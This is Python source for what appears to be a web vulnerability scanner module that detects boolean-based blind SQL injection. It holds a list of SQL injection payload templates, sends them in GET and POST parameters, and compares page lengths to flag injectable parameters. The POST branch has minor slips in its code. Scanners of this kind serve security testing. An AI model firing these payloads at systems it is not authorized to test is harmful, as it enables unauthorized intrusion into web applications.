try:
    from urllib import quote_plus
except ImportError:
    from urllib.parse import quote_plus
import requests
import random
import helios.modules.module_base
from helios.core.utils import requests_response_to_dict, random_string


class Module(helios.modules.module_base.Base):
    def __init__(self):
        self.name = "Blind SQL Injection (Boolean Based)"
        self.active = True
        self.module_types = ['injection']
        self.possibilities = {
            'bool_int_and': "{original_value} AND ({query})",
            'bool_int_and_comment': "{original_value} AND ({query})--",
            'bool_int_or': "-1 OR ({query})",
            'bool_int_or_comment': "-1 OR ({query})--",
            'bool_int_and_group_comment': "{original_value}) AND ({query})--",
            'bool_str_and': "{original_value}' AND ({query}) OR 'a'='b",
            'bool_str_or': "invalid' OR ({query}) OR 'a'='b",
            'bool_str_and_comment': "{original_value}' AND ({query})--",
            'bool_str_or_comment': "invalid' OR ({query})--",
            'bool_str_and_group_comment': "{original_value}') AND ({query})--",
        }

        self.can_use_content_length = True
        self.is_stable = True
        self.severity = 3

        self.auto = True
        self.headers = {}
        self.cookies = {}
        self.input = "urldata"
        self.output = "vulns"
        self.aggressive = False

    def run(self, url, data={}, headers={}, cookies={}):
        if not self.active and 'passive' not in self.module_types:
            # cannot send requests and not configured to do passive analysis on data
            return
        base, param_data = self.get_params_from_url(url)
        self.cookies = cookies
        self.headers = headers
        results = []
        if not data:
            data = {}
        for param in param_data:
            result = self.inject(base, param_data, data, parameter_get=param, parameter_post=None)
            if result:
                response, match = result
                results.append({'request': requests_response_to_dict(response), "match": match})

        for param in data:
            result = self.inject(base, param_data, data, parameter_get=None, parameter_post=param)
            if result:
                response, match = result
                results.append({'request': requests_response_to_dict(response), "match": match})
        return results

    def send(self, url, params, data=None):
        result = None
        headers = self.headers
        cookies = self.cookies
        try:
            if data:
                result = requests.post(url, params=params, data=data, headers=headers, cookies=cookies)
            else:
                result = requests.get(url, params=params, headers=headers, cookies=cookies)

        except Exception:
            return False
        return result

    def getlen(self, response):
        if not response:
            return 0
        if self.can_use_content_length:
            for header in response.headers:
                if header.lower() == 'content-length':
                    return int(response.headers[header])
            self.can_use_content_length = False
        return len(response.text)

    def inject(self, url, params, data=None, parameter_get=None, parameter_post=None):
        if parameter_get:
            tmp = dict(params)
            ogvalue = tmp[parameter_get]

            get_firstpage = self.send(url, tmp, data)
            firstpage_len = self.getlen(get_firstpage)

            get_firstpage_two = self.send(url, tmp, data)
            second_page = self.getlen(get_firstpage_two)
            if second_page != firstpage_len:
                # cannot check with random page length (dynamic content)
                return False
            rstring = random_string()
            tmp[parameter_get] = rstring
            check_reflection = self.send(url, params=tmp, data=data)
            if rstring in check_reflection.text:
                # query values are reflected, cannot test using only page length
                return False
            tmp[parameter_get] = ogvalue

            for injection in self.possibilities:
                injection_query = self.possibilities[injection]

                random_true = random.randint(9999, 999999)
                random_false = random_true + 1

                query_true = "%d=%d" % (random_true, random_true)
                query_false = "%d=%d" % (random_true, random_false)

                injection_query_true = injection_query.replace('{original_value}', ogvalue)
                injection_query_true = injection_query_true.replace('{query}', query_true)

                tmp[parameter_get] = injection_query_true
                page_data = self.send(url, params=tmp, data=data)

                datalen_true = self.getlen(page_data)

                if True:
                    # might be vulnerable because query caused original state
                    injection_query_false = injection_query.replace('{original_value}', ogvalue)
                    injection_query_false = injection_query_false.replace('{query}', query_false)

                    tmp[parameter_get] = injection_query_false
                    get_data = self.send(url, params=tmp, data=data)
                    datalen = self.getlen(get_data)
                    if get_data and datalen != datalen_true:
                        return (get_data, {"injection": injection.upper(),
                                "parameter": parameter_get,
                                "location": "url",
                                "query_true": injection_query_true,
                                "query_false": injection_query_false,
                                "states": {
                                    "true_length": datalen_true,
                                    "false_length": datalen
                                }})

        if parameter_post:
            tmp = dict(data)
            ogvalue = tmp[parameter_post]

            get_firstpage = self.send(url, params, tmp)
            firstpage_len = self.getlen(get_firstpage)

            get_firstpage_two = self.send(url, params, tmp)
            second_page = self.getlen(get_firstpage_two)
            if second_page != firstpage_len:
                # cannot check with random page length (dynamic content)
                return False

            rstring = random_string()
            tmp[parameter_post] = rstring
            check_reflection = self.send(url, params=params, data=tmp)
            if rstring in check_reflection.text:
                # query values are reflected, cannot test using only page length
                return False
            tmp[parameter_post] = ogvalue

            for injection in self.possibilities:
                injection_query = self.possibilities[injection]

                random_true = random.randint(9999, 999999)
                random_false = random_true + 1

                query_true = "%d=%d" % (random_true, random_true)
                query_false = "%d=%d" % (random_true, random_false)

                injection_query_true = injection_query.replace('{original_value}', ogvalue)
                injection_query_true = injection_query_true.replace('{query}', query_true)

                tmp[parameter_post] = injection_query_true
                page_data = self.send(url, params=params, data=tmp)
                if str(random_true) in page_data.text:
                    # query values are reflected, cannot test using only page length
                    continue

                datalen_true = self.getlen(page_data)

                if True:
                    # might be vulnerable because query caused original state
                    injection_query_false = injection_query.replace('{original_value}', ogvalue)
                    injection_query_false = injection_query_false.replace('{query}', query_false)

                    tmp[parameter_post] = injection_query_false
                    get_postdata = self.send(url, params=data, data=tmp)
                    datalen = self.getlen(get_postdata)
                    if get_postdata and datalen != datalen_true:
                        return (get_postdata, {"injection": injection.upper(),
                                               "parameter": parameter_post,
                                               "location": "url",
                                               "query_true": injection_query_true,
                                               "query_false": injection_query_false,
                                               "states": {
                                                   "true_length": datalen_true,
                                                   "false_length": datalen
                                               }})
        return None
